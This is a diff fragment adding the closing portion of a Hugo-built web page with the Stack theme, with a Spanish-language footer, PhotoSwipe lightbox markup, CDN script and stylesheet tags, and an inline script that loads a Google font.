+    </section>
+    
+    <section class="powerby">
+        Creado con <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
